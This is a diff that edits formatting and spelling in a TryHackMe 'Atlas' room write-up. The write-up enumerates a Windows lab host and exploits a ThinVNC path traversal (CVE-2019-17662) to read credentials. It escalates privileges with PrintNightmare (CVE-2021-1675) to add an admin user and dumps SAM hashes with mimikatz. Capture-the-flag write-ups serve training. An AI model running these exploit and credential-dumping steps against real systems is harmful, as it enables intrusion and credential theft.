@@ -6,7 +6,7 @@ categories:
   - TryHackMe
 ---
 
-<img src="atlas.jpg" alt="atlas"/>
+{{< post-img src="atlas.jpg" alt="atlas" >}}
 
 they say its an easy windows room for beginners
 
@@ -18,9 +18,7 @@ Quick note here...for windows machines -Pn flag for nmap is useful for bypassing
 
 ## Enumeration
 
-### Nmap
-
-```
+```bash
 PORT     STATE SERVICE       REASON
 3389/tcp open  ms-wbt-server syn-ack
 | ssl-cert: Subject: commonName=GAIA
@@ -65,7 +63,7 @@ Host script results:
 
 ok let's check the website
 
-```
+```bash
 ──╼ $curl 10.10.246.176:8080 -v
 
 - Trying 10.10.246.176:8080...
@@ -89,7 +87,7 @@ thinVnC? what is that? I know vnc but why is this one thin?
 
 Google is my homie
 
-```
+```bash
 └──╼ $searchsploit thinvnc
 
 ---
@@ -109,7 +107,7 @@ Thanks MuirlandOracle for CVE-2019-17662.py
 
 I copied that as `thinvnc_exploit.py`
 
-```
+```bash
 
 └──╼ $python thinvnc_exploit.py 10.10.246.176 8080
 
@@ -131,7 +129,7 @@ ok this room is hand-holding but I appreciate it
 
 simply put this script does a path traversal on host/port to read the `thinvnc.ini` file (by default)
 
-someting more like `http://host:port/abc/../../ThinVNC.ini`
+something more like `http://host:port/abc/../../ThinVNC.ini`
 
 then reads it and search for Credentials...
 
@@ -141,11 +139,11 @@ The last part of this command share a folder of target with or own /tmp folder
 
 Thats pretty cool huh?
 
-## privilages escalation
+## privilege escalation
 
 ### printnightmare (or cve-2021-1675)
 
-when you hae access to powershell and spool service (printer) is running
+when you have access to powershell and spool service (printer) is running
 
 think of printnightmare
 
@@ -161,9 +159,9 @@ Then we start stuff
 
 `Invoke-Nightmare`
 
-wich creates a new admin user for us
+which creates a new admin user for us
 
-```
+```bash
 PS C:\Users\Atlas> . \\tsclient\share\CVE-2021-1675-main\CVE-2021-1675.ps1
 
 PS C:\Users\Atlas> Invoke-Nightmare
@@ -183,7 +181,7 @@ The command is as follows:
 
 y tho? you ask? for the lulz of course
 
-```
+```bash
 Microsoft Windows [Version 10.0.17763.1821]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
@@ -222,7 +220,7 @@ and copy to /tpm...same stuff
 
 Now mimikatz commands in action
 
-```
+```bash
 mimikatz # privilege::debug
 Privilege '20' OK
 
@@ -240,7 +238,7 @@ SID name : NT AUTHORITY\SYSTEM
 
 Now the precious hashes
 
-```
+```bash
 mimikatz # lsadump::sam
 Domain : GAIA
 SysKey : 36c8d26ec0df8b23ce63bcefa6e2d821
